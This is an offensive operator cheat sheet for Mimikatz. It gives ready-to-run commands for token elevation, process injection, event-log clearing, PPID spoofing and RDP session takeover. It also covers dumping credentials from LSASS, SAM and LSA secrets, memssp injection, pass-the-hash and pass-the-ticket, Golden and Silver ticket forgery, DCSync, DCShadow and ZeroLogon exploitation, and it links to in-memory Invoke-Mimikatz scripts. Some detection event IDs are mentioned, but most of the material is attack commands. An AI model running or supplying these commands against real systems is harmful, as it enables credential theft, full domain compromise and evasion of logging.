
![[Pasted image 20260227171733.png]]

> [!info]+ Log Module – Save Command Output
> Allows saving Mimikatz session output to a file.
> ---
> ## Start Logging
> ```bash
> mimikatz # log C:\Temp\msupdate.log
> ```
> - Creates a log file at the specified path  
> - You must define the full file path and file name  
> - All subsequent command output will be written to this file  
> ---
> ## Stop Logging
> ```bash
> mimikatz # log /stop
> ```
> Stops writing output to the log file.

> [!info]- AppLocker Bypass & Misc Module Capabilities
>
> The `misc` module in Mimikatz includes helper functions that may assist in bypassing application control mechanisms.
>
> ---
>
> ## Launch Built-in Tools
>
> ```bash
> mimikatz # misc::cmd
> mimikatz # misc::regedit
> mimikatz # misc::taskmgr
> ```
>
> Launches trusted Windows binaries that may bypass weak AppLocker policies.
>
> ---
>
> ## List Installed Mini-Filter Drivers
>
> ```bash
> mimikatz # misc::mflt
> ```
>
> Displays installed file system mini-filter drivers.
>
> ---
>
> ## Change Desktop Wallpaper
>
> ```bash
> mimikatz # misc::wp /file:C:\Users\Desktop\2.png
> ```
>
> Sets desktop wallpaper to specified file.
>
> ---
>
> ## Capture Clipboard Content
>
> ```bash
> mimikatz # misc::clip
> ```
>
> Attempts to capture clipboard data.
>
> Monitoring Note:
> - Injection into `csrss.exe`
> - Sysmon Event ID **8** → Remote thread creation
>
> ---
>
> ## Detours (Hooking Mechanism)
>
> ```bash
> mimikatz # misc::detours
> ```
>
> Uses API hooking techniques that may assist in defense evasion.

> [!tip]- Windows Privileges & Mimikatz Privilege Module
>
> Privileges define what actions a security token can perform on the system.
>
> ---
>
> ## Relevant Event IDs
>
> - **4672** → Special privileges assigned to new logon  
> - **4703** → A user right was adjusted  
> - **4688** → Process creation  
>
> These events help detect privilege abuse or elevation attempts.
>
> ---
>
> ## Enable Debug Privilege
>
> ```bash
> mimikatz # privilege::debug
> ```
>
> Enables **SeDebugPrivilege**  
> Required to interact with protected processes (e.g., LSASS).
>
> ---
>
> ## Driver Privilege
>
> ```bash
> mimikatz # privilege::driver
> ```
>
> Enables **SeLoadDriverPrivilege**  
> Allows loading/unloading kernel drivers.
>
> ---
>
> ## Security Log Access
>
> ```bash
> mimikatz # privilege::security
> ```
>
> Enables **SeSecurityPrivilege**  
> Grants access to Security event logs.
>
> ---
>
> ## TCP Privilege
>
> ```bash
> mimikatz # privilege::tcp
> ```
>
> Enables **SeTcbPrivilege**  
> Allows acting as part of the operating system.
>
> ---
>
> ## Backup Privilege
>
> ```bash
> mimikatz # privilege::backup
> ```
>
> Enables **SeBackupPrivilege**  
> Allows read access to protected files regardless of ACL.
>
> ---
>
> ## Restore Privilege
>
> ```bash
> mimikatz # privilege::restore
> ```
>
> Enables **SeRestorePrivilege**  
> Allows write access bypassing file permissions.
>
> ---
>
> ## System Environment Privilege
>
> ```bash
> mimikatz # privilege::sysenv
> ```
>
> Enables **SeSystemEnvironmentPrivilege**  
> Allows modification of system firmware environment variables.

> [!warning]- Privilege Escalation – Token Abuse & Process Injection
>
> MITRE ATT&CK:
> https://attack.mitre.org/techniques/T1134/001
>
> ---
>
> ## Token Overview
>
> A **Token** represents the security context of a process.
>
> - Contains user identity
> - Contains privileges
> - Determines what actions a process can perform
>
> ---
>
> ## Important Event IDs
>
> - **4672** → Special privileges assigned to new logon
> - **4688** → New process creation
>
> ---
>
> ## Token Enumeration
>
> ```bash
> mimikatz # token::whoami
> ```
>
> Show current token user.
>
> ```bash
> mimikatz # token::list
> ```
>
> List available tokens and associated process IDs.
>
> Filter by user:
>
> ```bash
> mimikatz # token::list /user:administrator
> mimikatz # token::list /user:system
> mimikatz # token::list /user:domainadmin
> ```
>
> ---
>
> ## Token Impersonation
>
> Elevate to SYSTEM:
>
> ```bash
> mimikatz # token::elevate
> ```
>
> Revert to previous token:
>
> ```bash
> mimikatz # token::revert
> ```
>
> ---
>
> ## Process Injection Attack
>
> MITRE ATT&CK:
> https://attack.mitre.org/techniques/T1055
>
> Example technique: **Process Herpaderping**
>
> Concept:
> - Modify executable signature/state on disk
> - Execute payload under disguised name
>
> Reference:
> https://github.com/jxy-s/herpaderping/
>
> Example:
>
> ```powershell
> .\processherpaderpng.exe .\mimikatz name.exe C:\windows\system32\lsass.exe
> ```
>
> Followed by:
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # token::elevate
> mimikatz # process::runp /run:"fullpath\name.exe" /ppid:<parentPID>
> ```
>
> ---
>
> ## Scenario – Elevate to SYSTEM
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # token::list
> mimikatz # token::elevate /user:system
> mimikatz # token::whoami
> mimikatz # token::run /process:cmd.exe
> ```
>
> Flow:
> 1. Enable debug privilege
> 2. Enumerate tokens
> 3. Impersonate SYSTEM
> 4. Verify context
> 5. Spawn process under elevated token

> [!danger]- Defense Evasion – Log Tampering & PPID Spoofing
>
> MITRE ATT&CK:
> https://attack.mitre.org/techniques/T1070/001
>
> ---
>
> ## Clear Windows Event Logs
>
> - Event ID **1102** → Security log cleared
> - Event ID **4663** → Object access (e.g., log file interaction)
>
> Commands:
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # event::clear
> ```
>
> Clear Windows Event Logs.
>
> ---
>
> ## Drop Event Generation
>
> ```bash
> mimikatz # event::drop
> ```
>
> Attempt to interfere with event logging generation.
>
> ---
>
> ## Environment Variable Manipulation
>
> ```bash
> mimikatz # !sysenv
> mimikatz # !sysenvdel
> ```
>
> - `!sysenv` → show system environment variables  
> - `!sysenvdel` → delete system environment variables  
>
> ---
>
> ---
>
> ## Parent PID Spoofing
>
> MITRE ATT&CK:
> https://attack.mitre.org/techniques/T1134/004/
>
> Create process with spoofed parent PID:
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # token::elevate
> mimikatz # process::runp /run:"powershell.exe" /ppid:5828
> ```
>
> Note:
> - If `/ppid` is not specified, default parent may be `lsass.exe`
> - Used to evade behavioral detection based on process lineage

> [!tip]- Remote Access – RPC, RDP & Built-in Methods
>
> Mimikatz can operate in client/server mode over RPC (default port 135).
>
> ---
>
> ## RPC Server (Windows Side)
>
> Start RPC server:
>
> ```bash
> mimikatz # rpc::server
> ```
>
> Stop RPC server:
>
> ```bash
> mimikatz # rpc::server /stop
> ```
>
> Enable secure mode (encrypted channel):
>
> ```bash
> mimikatz # rpc::server /secure
> ```
>
> ---
>
> ## RPC Client (Remote System)
>
> Connect to remote RPC server:
>
> ```bash
> mimikatz # rpc::connect /server:172.20.10.1
> ```
>
> Specify encryption algorithm:
>
> ```bash
> mimikatz # rpc::connect /server:172.20.10.1 /alg:RC4
> ```
>
> Close connection:
>
> ```bash
> mimikatz # rpc::close
> ```
>
> ---
>
> ## Base64 Encoding Mode
>
> Useful for encoded input/output handling:
>
> ```bash
> mimikatz # base64 /out:true /in:true
> ```
>
> ---
>
> ## RDP Takeover
>
> MITRE ATT&CK:
> https://attack.mitre.org/techniques/T1563/002/
>
> Enable multiple RDP sessions:
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # ts::multirdp
> ```
>
> List active RDP sessions:
>
> ```bash
> mimikatz # ts::sessions
> ```
>
> Remote control session:
>
> ```bash
> mimikatz # ts::remote /id:<sessionID> /target:<sessionID> /password:<password>
> ```
>
> ---
>
> ## Built-in Windows Remote Methods
>
> ### WinRM / WinRS
>
> ```powershell
> winrm
> winrs
> ```
>
> ---
>
> ### PowerShell Remoting
>
> ```powershell
> Enter-PSSession -ComputerName <hostname>
> ```
>
> ---
>
> ### WMIC Remote Command Execution
>
> ```powershell
> wmic /node:<172.20.10.1> process call create calc
> ```

> [!info]- Service Module – Manage Windows Services
>
> Allows starting and stopping Windows services directly from Mimikatz.
>
> ---
>
> ## Start a Service
>
> ```bash
> mimikatz # service::start <service_name>
> ```
>
> Example:
>
> ```bash
> mimikatz # service::start bits
> ```
>
> ---
>
> ## Stop a Service
>
> ```bash
> mimikatz # service::stop <service_name>
> ```
>
> Example:
>
> ```bash
> mimikatz # service::stop bits
> ```
>
> ---
>
> ## Persistence via Service Control
>
> Internal service control commands:
>
> ```bash
> mimikatz # service::+
> mimikatz # service::-
> ```
>
> - `service::+` → start Mimikatz service  
> - `service::-` → stop Mimikatz service
>
> Can be used for maintaining execution through a service context.

> [!warning]- Process Module – Manage Windows Processes
>
> Allows interaction with system processes directly from Mimikatz.
>
> ---
>
> ## List Processes
>
> ```bash
> mimikatz # process::list
> ```
>
> Displays running processes with PID information.
>
> ---
>
> ## Run Process (Hidden / Non-Interactive)
>
> ```bash
> mimikatz # process::run "command"
> ```
>
> Example:
>
> ```bash
> mimikatz # process::run "cmd.exe /c dir"
> ```
>
> - Executes command
> - Non-interactive
> - Output not attached to visible console
>
> ---
>
> ## Run Process with Spoofed Parent (PPID Spoofing)
>
> ```bash
> mimikatz # process::runp /run:"fullpath_or_name.exe" /ppid:<parentPID>
> ```
>
> Example:
>
> ```bash
> mimikatz # process::runp /run:"cmd.exe" /ppid:1234
> ```
>
> - Creates process with specified parent PID
> - Used for evasion techniques
>
> ---
>
> ## Start Interactive Process
>
> ```bash
> mimikatz # process::start "cmd.exe"
> ```
>
> - Launches interactive process
>
> ---
>
> ## Stop Process
>
> ```bash
> mimikatz # process::stop /pid:<PID>
> ```
>
> ---
>
> ## Suspend Process
>
> ```bash
> mimikatz # process::suspend /pid:<PID>
> ```
>
> ---
>
> ## Resume Process
>
> ```bash
> mimikatz # process::resume /pid:<PID>
> ```
>
> ---
>
> ## Terminate Process
>
> ```bash
> mimikatz # process::terminate /pid:<PID>
> ```

> [!info]- Hash Dump – LSA & Credential Protection Overview
>
> ---
>
> ## LSA Protection (RunAsPPL)
>
> If **UEFI** and **Secure Boot** are enabled, LSA Protection can be active.
>
> Registry Location:
>
> ```
> HKLM:\System\CurrentControlSet\Control\Lsa
> ```
>
> Key:
>
> - Name: `RunAsPPL`
> - Type: `DWORD`
> - Value: `1` → LSA Protection Enabled
>
> When enabled:
> - `lsass.exe` runs as a Protected Process Light (PPL)
> - Prevents unsigned processes from reading LSASS memory
>
> ---
>
> ## Credential Guard
>
> Credential Guard requires:
>
> - UEFI
> - 64-bit OS
> - Virtualization Extensions enabled in BIOS
> - TPM
>
> It isolates the `lsass.exe` secrets using **Virtual Secure Mode (VSM)**.
>
> ---
>
> ## Virtual Secure Mode (VSM)
>
> - Creates an isolated execution environment
> - Sensitive LSA secrets move to isolated process:
>
> ```
> LSAISO.exe
> ```
>
> Result:
> - Even if attacker accesses LSASS, credentials may not be directly readable
>
> ---
>
> ## SACL (System Access Control List)
>
> - Used for auditing
> - Can generate logs when LSASS is accessed
>
> Useful for detecting credential dumping attempts.
>
> ---
>
> ## Authentication Flow (Internal)
>
> ```
> Authentication Request
>        ↓
> LSA (Local Security Authority)
>        ↓
> lsass.exe
>        ↓
> Security Support Provider (SSP)
> ```
>
> ---
>
> ## Credential Storage Locations
>
> - **Registry (SAM hive)** → Local account hashes
> - **LSASS Memory** → Active logon sessions
> - **SSP Modules** → Authentication packages
>
> ---
>
> ## SSP (Security Support Provider)
>
> SSPs are authentication modules loaded by LSASS.
>
> Examples:
> - NTLM
> - Kerberos
> - WDIGEST
>
> They handle authentication protocols and may temporarily hold credentials in memory.
### Credential Guard Bypass & LSASS Interaction

> [!warning]- Bypass Credential Guard & Touch LSASS
> Techniques to interact with or modify LSASS protections.
>
> ---
>
> ### Load Mimikatz Driver (mimidrv)
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # !+
> mimikatz # !ping
> mimikatz # !bsod // blue screen
> ```
>
> Test or dangerous functions:
>
> ```bash
> mimikatz # !process
> mimikatz # !processprotect /process:lsass.exe /remove
> ```
>
> ---
>
> ### Patch LSA Protection
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # lsadump::lsa /patch
> mimikatz # lsadump::lsa /inject
> ```
### Dump Hash – Touching LSASS Providers

>[!danger]- Dump Credentials from LSASS
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # sekurlsa::
> mimikatz # sekurlsa::msv
> mimikatz # sekurlsa::logonpasswords
> ```
> - `msv` → NTLM hashes  
> - `logonpasswords` → all available providers

### Inject SSP (Custom Security Support Provider)

> [!danger]- Inject Custom SSP (memssp)
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # misc::memssp
> ```
>
> Loads a custom SSP (mimilib) into registry.
>
> If user logs out and logs back in:
> - Credentials may be written in cleartext to:
>
> ```
> C:\Windows\System32\mimilsa.log
> ```
>
> Example to force re-authentication:
>
> ```cmd
> rundll32 user32.dll,LockWorkstation
> ```

### Dumping SAM & Registry Credentials

> [!warning]- Dump SAM (Registry Extraction)
>
> Registry SAM is protected with SysKey.
>
> Export registry hives:
>
> ```cmd
> reg save HKLM\SYSTEM system & reg save HKLM\SAM sam
> ```
> Dump using Mimikatz:
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # token::elevate
> mimikatz # lsadump::sam
> ```

### Cached Credentials & Secrets

> [!warning]- Cached Credentials & LSA Secrets
>
> Registry location:
>
> ```
> HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
> ```
>
> Dump cached credentials:
>
> ```bash
> mimikatz # lsadump::cache
> ```
>
> Dump LSA secrets:
>
> ```bash
> mimikatz # lsadump::secrets
> ```
>
> May include:
> - VPN credentials
> - RDP private keys
> - Service account secrets

### Pass-The-Hash Attack

> [!warning]- Pass-The-Hash (PTH)
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # sekurlsa::msv
> mimikatz # sekurlsa::pth /user:<user> /domain:adolf.local /ntlm:<hash> /run:cmd.exe
> ```
>
> Lateral movement example:
>
> ```cmd
> PsExec.exe \\hostname cmd
> ```

## DC ATTACK
---

> [!info]+ Kerberos Overview
> **KDC (Key Distribution Center)** runs on the Domain Controller and handles authentication and ticket issuance.
>
> ---
>
> ### Authentication Flow
>
> - **AS-REQ**  
>   Client sends authentication request to KDC.  
>   Includes:
>   - Encrypted timestamp (using user password hash)
>   - Identity (user, service, domain)
>
> - **AS-REP**  
>   KDC returns a **TGT (Ticket Granting Ticket)**.
>
> - **TGS-REQ**  
>   Client requests a service ticket from KDC using the TGT.
>
> - **TGS-REP**  
>   KDC issues a **TGS (Service Ticket)**.
>
> - **AP-REQ**  
>   Client presents TGS to target service (SMB, FTP, HTTP, etc.).
>
> ---
>
> ### Important Components
>
> - **krbtgt**
>   - Signs and encrypts TGTs
>   - Only KDC can validate TGT integrity
>
> - **SPN (Service Principal Name)**
>   - Unique identifier for services in AD
>   - Used by Kerberos to associate tickets with services

> [!warning]- Over Pass The Hash (OPTH)
> Over Pass The Hash combines **Pass-the-Hash (PTH)** and **Pass-the-Ticket (PTT)** techniques.  
> The attacker uses NTLM material to obtain or forge Kerberos authentication.
>
> **MITRE ATT&CK**
> - https://attack.mitre.org/techniques/T1550/002
> - https://attack.mitre.org/techniques/T1550/003
>
> ---
>
> ### Step 1: Extract NTLM Credentials
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # sekurlsa::msv
> ```
>
> ---
>
> ### Step 2: Pass-the-Hash (Create Logon Session)
>
> ```bash
> mimikatz # sekurlsa::pth /user:<user> /domain:domain.local /ntlm:<hash>
> ```
>
> ---
>
> ## Pass The Ticket (PTT)
>
> If attacker already has a TGT, no need for AS-REQ / AS-REP.
>
> Tickets can be extracted from LSASS memory.
>
> ---
>
> ### Dump Tickets
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # kerberos::list
> mimikatz # kerberos::list /export
> mimikatz # kerberos::tgt
> mimikatz # sekurlsa::tickets
> ```
>
> ---
>
> ### Request TGT (If Password Known)
>
> ```bash
> kekeo # tgt::ask /domain:domain.local /user:user /password:password
> ```
>
> ---
>
> ### Import Ticket (PTT)
>
> ```bash
> mimikatz # kerberos::ptt ticket.kirbi
> mimikatz # kerberos::list
> ```
>
> ---
>
> ### Test Access
>
> ```bash
> mimikatz # process::run "net use \\servername\admin$"
> ```
>
> ---
>
> ### Change Password Using TGT
>
> ```bash
> kekeo # misc::changepw /tgt:user@domain.local.kirbi /new:newpassword
> ```
>
> ---
>
> ### Request TGS Manually
>
> ```bash
> mimikatz # kerberos::ask /target:CIFS/hostname.domain.local
> ```

> [!warning]-  Golden Ticket (TGT)
> A Golden Ticket attack forges a Kerberos **TGT (Ticket Granting Ticket)** using the `krbtgt` account hash.  
> With this ticket, an attacker can authenticate as any user in the domain with arbitrary privileges.
>
> **MITRE ATT&CK**  
> https://attack.mitre.org/techniques/T1558/001
>
> ---
>
> ### Requirements
>
> - Domain FQDN (e.g., `adolf.local`)
> - Domain SID (e.g., `S-1-5-21-...`)
> - `krbtgt` hash (NTLM or AES)
> - Target user RID (e.g., 500 = Administrator)
>
> ---
>
> ### Get Domain SID
>
> ```bash
> mimikatz # net::trust
> mimikatz # lsadump::trust
> ```
>
> ---
>
> ### Dump krbtgt Hash
>
> **If you have access to the Domain Controller:**
> ```bash
> mimikatz # sekurlsa::krbtgt   # AES128 / AES256
> ```
>
> **Remote (via DCSync):**
> ```bash
> mimikatz # lsadump::dcsync /user:adolf\krbtgt /csv   # NTLM
> ```
>
> ---
>
> ### Create Golden Ticket
>
> ```bash
> mimikatz # kerberos::golden /domain:adolf.local /sid:<domainSID> /user:administrator /id:500 /krbtgt:<NTLMhash> /ptt /ticket:C:\Temp\cna_golden
> ```
>
> ---
>
> ### Optional Parameters
>
> - `/aes128:<AEShash>` or `/aes256:<AEShash>`
> - `/sids:513,512,500`  (add group SIDs: Domain Users, Domain Admins, etc.)
> - `/endin:50`  (validity in years)

> [!info]-  Silver Ticket (TGS)
> A Silver Ticket attack forges a Kerberos **TGS (Ticket Granting Service)** ticket for a specific service using the target server’s NTLM hash.  
> Unlike Golden Ticket, it does NOT require the `krbtgt` hash and does not interact with the Domain Controller after ticket creation.
>
> ---
>
> ---  
>  
> ### SPN (Service Principal Name)  
> SPN is a unique service identifier in Active Directory used by Kerberos to associate a service instance with a service account.  
>  
> **Common SPNs**  
>  
> | SPN | Service |  
> |---------|---------|  
> | TERMSRV | RDP |  
> | CIFS | SMB |  
> | WSMAN | WinRM |  
> | SMTP | SMTP |  
> | MSSQL | SQL |  
> | LDAP | LDAP |  
> | DNS | DNS |  
>  
> ---
> ---
>
> ### Enumerating SPNs (PowerShell)
>
> ```powershell
> $filter='(&(objectCategory=computer)(servicePrincipalName=*))'
> $search=[adsisearcher]$filter
> $search.PageSize=1000
> $search.FindAll().Properties
> ```
>
> Or target a specific host:
>
> ```powershell
> ([adsisearcher]"(&(objectCategory=computer)(name=<hostname>))").FindAll().Properties
> ```
>
> ---
>
> ### Silver Ticket Attack Steps
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # token::elevate
> mimikatz # lsadump::secrets   # extract $MACHINE.ACC (NTLM hash)
> mimikatz # lsadump::trust OR net::trust # obtain Domain SID
> mimikatz # kerberos::list     # identify target service/server
> ```
>
> Forge the Silver Ticket:
>
> ```bash
> mimikatz # kerberos::golden /user:administrator /domain:domain.local /sid:<domainSID> /rc4:<MACHINE_NTLM> /target:hostname.domain.local /service:cifs /ptt
> ```
>
> ---
>
> ### Optional: RC4 Brute/Service Ticket Request
>
> ```bash
> kekeo # kerberos::ask /service:cifs/hostname.domain.local /roast /export
> ```

> [!danger]- DCSync
> DCSync is an Active Directory attack technique where the attacker impersonates a Domain Controller and requests account replication data from a legitimate DC.  
> It allows dumping password hashes without directly accessing the Domain Controller.
>
> **Detection**
> - Event ID: `4662` (Directory Service Access)
>
> **Required Privileges**
> - Domain Admin  
> - Enterprise Admin  
> - Replication permissions (e.g., Replicating Directory Changes)
>
> ---
>
> ### Dump Specific Account (e.g., krbtgt)
> ```bash
> mimikatz # lsadump::dcsync /user:krbtgt
> ```
>
> ---
>
> ### Dump All Domain Users
> ```bash
> mimikatz # lsadump::dcsync /all
> ```
> ---
> ### Dump All Users (CSV Format)
> ```bash
> mimikatz # lsadump::dcsync /all /csv
> ```

> [!warning]- DCShadow
> DCShadow is an Active Directory attack technique where the attacker registers a rogue Domain Controller and pushes malicious replication data to a legitimate DC.  
> Unlike DCSync (which pulls data), DCShadow **injects and replicates modified objects** into the directory.
>
> **Required Privileges**
> - Domain Admin / Enterprise Admin / Replication privileges
> - SYSTEM-level access
> - Firewall disabled (to allow replication traffic)
>
> **MITRE ATT&CK**
> https://attack.mitre.org/techniques/T1207
>
> ---
>
> ### Step 1: Open Mimikatz with SYSTEM Access
> ```bash
> cmd > psexec64.exe -si cmd
> cmd > .\mimikatz.exe
> ```
>
> ```bash
> mimikatz # privilege::debug
> mimikatz # token::elevate
> ```
>
> ---
>
> ### Step 2: Prepare Attribute Changes (Stack)
>
> ```bash
> mimikatz # lsadump::dcshadow /stack /object:hostname$ /attribute:badPwdCount /value:999
> mimikatz # lsadump::dcshadow /stack /object:username /attribute:primaryGroupID /value:512
> mimikatz # lsadump::dcshadow /stack /object:username /attribute:unicodePwd /value:00000000000000000000000000000000 <32-character-NTLM-hash>
> ```
>
> View stacked changes:
> ```bash
> mimikatz # lsadump::dcshadow /viewstack
> ```
>
> ---
>
> ### Step 3: Push Changes to Domain Controller
>
> ```bash
> mimikatz # lsadump::dcshadow /push
> ```
>
> ---
>
> ### Verify Changes (PowerShell)
>‍‍‍ 
> ```powershell
> ([adsisearcher]"(&(objectClass=user)(objectCategory=person))").FindAll().Properties
> ```
> ```powershell
> ([adsisearcher]"(&(objectCategory=computer)(name=<hostname>))").findall.properties
> ```

 > [!tip]- ZeroLogon
>  ZeroLogon is a critical vulnerability in the Netlogon authentication protocol used by Windows Domain Controllers. 
> Due to a flaw in the cryptographic implementation, an attacker within the network can impersonate a domain-joined computer — including the Domain Controller itself.
> If exploited on an unpatched system, this vulnerability can lead to full domain compromise by allowing unauthorized privilege escalation and access to sensitive authentication  data.
>```bash
>lsadump::zerologon /target:hostname.domain.local /account:hostname$ /null /ntlm
>```
>```bash
>lsadump::zerologon /target:hostname.domain.local /account:hostname$ /null /ntlm /exploit
>```
>```bash
> lsadump::dcsync /domain /dc /user:krbtgt /auth:hostname$ /authdomain: /authpassword:"" /authntlm
>```
>#### 1. `lsadump::zerologon`
>Attempts to exploit the Netlogon authentication flaw to impersonate the Domain Controller machine account.  
>If successful, it can reset the DC machine password (when used with `/exploit`).
>#### 2. `lsadump::zerologon /exploit`
>Forces the Domain Controller machine account password to an empty value, allowing authentication as the DC.
>#### 3. `lsadump::dcsync`
Uses the obtained DC authentication to perform a DCSync attack and retrieve password hashes (e.g., `krbtgt`), potentially leading to full domain compromise.

## Commands list

> [!info] Overview Command 
> 
| Command                     | Definition                                                                                                                                                                                                                                                                                                                                         |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CRYPTO::Certificates        | list/export certificates                                                                                                                                                                                                                                                                                                                           |
| CRYPTO::Certificates        | list/export certificates                                                                                                                                                                                                                                                                                                                           |
| KERBEROS::Golden            | create golden/silver/trust tickets                                                                                                                                                                                                                                                                                                                 |
| KERBEROS::List              | list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.                                                                                                                                                                          |
| KERBEROS::PTT               | pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).                                                                                                                                                                                                                                                |
| LSADUMP::DCSync             | ask a DC to synchronize an object (get password data for account). No need to run code on DC.                                                                                                                                                                                                                                                      |
| LSADUMP::LSA                | Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”                                                       |
| LSADUMP::SAM                | get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.                                                                                            |
| LSADUMP::Trust              | Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).                                                                                                                                                                                            |
| MISC::AddSid                | Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.                                                                                                                                                                      |
| MISC::MemSSP                | Inject a malicious Windows SSP to log locally authenticated credentials.                                                                                                                                                                                                                                                                           |
| MISC::Skeleton              | Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.                                                                                                                                   |
| PRIVILEGE::Debug            | get debug rights (this or Local System rights is required for many Mimikatz commands).                                                                                                                                                                                                                                                             |
| SEKURLSA::Ekeys             | list Kerberos encryption keys                                                                                                                                                                                                                                                                                                                      |
| SEKURLSA::Kerberos          | List Kerberos credentials for all authenticated users (including services and computer account)                                                                                                                                                                                                                                                    |
| SEKURLSA::Krbtgt            | get Domain Kerberos service account (KRBTGT)password data                                                                                                                                                                                                                                                                                          |
| SEKURLSA::LogonPasswords    | lists all available provider credentials. This usually shows recently logged on user and computer credentials.                                                                                                                                                                                                                                     |
| SEKURLSA::Pth               | Pass- theHash and Over-Pass-the-Hash                                                                                                                                                                                                                                                                                                               |
| SEKURLSA::Tickets           | Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users). |
| TOKEN::List                 | list all tokens of the system                                                                                                                                                                                                                                                                                                                      |
| TOKEN::Elevate              | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box                                                                                                                                                                                                                                       |
| TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.                                                                                                                                                                                                                                                                                                 |


## Executable Version

- [Gentikiwi](https://github.com/gentilkiwi/mimikatz/wiki)
- [Zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad)

## PS Version

mimikatz in memory (no binary on disk) with:

- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit

More information can be grabbed from the Memory with:

- [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)
